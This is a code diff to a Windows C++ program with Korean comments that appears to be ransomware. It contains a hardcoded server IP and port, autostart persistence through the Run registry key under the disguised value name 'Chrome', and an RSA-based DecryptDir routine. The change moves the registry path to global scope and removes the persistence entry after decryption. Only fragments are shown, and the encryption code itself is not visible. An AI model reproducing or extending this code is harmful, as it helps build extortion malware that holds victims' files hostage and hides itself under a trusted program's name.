@@ -26,7 +26,7 @@ const string SERVER_IP = "3.36.117.40";
 const int SERVER_PORT = 54000;
 #define IDC_MAIN_BUTTON	101			// Button identifier
 #define IDC_MAIN_EDIT	102			// Edit box identifier
-
+const wchar_t* regKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
@@ -34,7 +34,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
     // 실행할 프로그램의 경로
     TCHAR programPath[MAX_PATH];
     GetModuleFileName(NULL, programPath, MAX_PATH);
-    const wchar_t* regKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+
 
     // 레지스트리에 등록
     HKEY hKey;
@@ -351,7 +351,32 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 DecryptDir(priKey, filename);
                 RSA_free(priKey);
 
-                return 0;
+
+                HKEY hKey;
+                LONG lResult;
+
+                // 레지스트리 키 열기
+                lResult = RegOpenKeyEx(HKEY_CURRENT_USER, regKeyPath, 0, KEY_SET_VALUE, &hKey);
+
+                if (lResult != ERROR_SUCCESS) {
+                    std::cerr << "Error opening registry key." << std::endl;
+                    return 1;
+                }
+
+                // 값 삭제
+                lResult = RegDeleteValue(hKey, L"Chrome");
+
+                if (lResult == ERROR_SUCCESS) {
+                    std::cout << "Value deleted successfully." << std::endl;
+                }
+                else {
+                    std::cerr << "Error deleting value." << std::endl;
+                }
+
+                // 레지스트리 키 닫기
+                RegCloseKey(hKey);
+
+                return DefWindowProc(hWnd, msg, wParam, lParam);
             }
         }
         break;
